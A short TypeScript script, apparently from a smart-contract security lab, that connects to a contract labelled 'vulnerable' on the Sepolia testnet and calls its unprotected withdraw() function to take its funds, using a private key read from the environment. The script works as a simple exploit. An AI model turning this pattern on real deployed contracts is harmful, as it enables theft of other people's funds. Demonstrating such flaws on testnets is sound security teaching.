import { ethers } from "ethers";
require('dotenv').config();

const provider = new ethers.JsonRpcProvider(process.env.SEPOLIA_ETH_RPC_URL!.toString());
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY!.toString(), provider);
const vulnerableContractAddress = process.env.VULNERABLE_CONTRACT!;

async function withdrawFunds() {
    try {
        // Create a contract instance
        const contract = new ethers.Contract(vulnerableContractAddress, [
            "function withdraw() public",
            "function getBalance() public view returns (uint256)"
        ], wallet);

        // Call the withdraw function
        const tx = await contract.withdraw();
        console.log("Transaction hash:", tx.hash);
        await tx.wait();
        console.log("Funds withdrawn successfully.");
    } catch (error) {
        console.error("Error withdrawing funds:", error);
    }
}

withdrawFunds();